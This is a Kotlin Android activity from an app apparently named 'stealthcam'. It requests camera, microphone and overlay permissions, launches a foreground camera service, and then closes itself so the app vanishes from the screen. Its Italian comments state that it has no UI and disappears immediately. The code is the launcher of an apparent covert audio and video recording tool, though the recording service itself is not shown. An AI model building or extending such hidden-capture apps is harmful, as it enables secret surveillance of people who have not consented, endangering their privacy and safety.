package com.stealthcam.app

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.content.pm.PackageManager

class MainActivity : AppCompatActivity() {

    private val REQUIRED_PERMISSIONS = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO
    ).apply {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P)
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            add(Manifest.permission.POST_NOTIFICATIONS)
    }.toTypedArray()

    private val permissionsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { results ->
            val allGranted = REQUIRED_PERMISSIONS
                .filter { it != Manifest.permission.POST_NOTIFICATIONS }
                .all { results[it] == true }
            if (allGranted) checkOverlayPermission()
            else { Toast.makeText(this, "Permessi fotocamera/microfono richiesti.", Toast.LENGTH_LONG).show(); finish() }
        }

    private val overlayLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
            if (Settings.canDrawOverlays(this)) { startService(); finish() }
            else { Toast.makeText(this, "Permesso overlay richiesto per funzionare.", Toast.LENGTH_LONG).show(); finish() }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Nessuna UI — l'app sparisce subito
        if (!allPermissionsGranted()) permissionsLauncher.launch(REQUIRED_PERMISSIONS)
        else checkOverlayPermission()
    }

    private fun checkOverlayPermission() {
        if (!Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "Concedi il permesso 'Visualizza sopra altre app'", Toast.LENGTH_LONG).show()
            overlayLauncher.launch(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
        } else {
            startService()
            finish() // ← App sparisce dalla schermata
        }
    }

    private fun startService() {
        val intent = Intent(this, CameraService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
        else startService(intent)
    }

    private fun allPermissionsGranted() = REQUIRED_PERMISSIONS
        .filter { it != Manifest.permission.POST_NOTIFICATIONS }
        .all { ContextCompat.checkSelfPermission(baseContext, it) == PackageManager.PERMISSION_GRANTED }
}
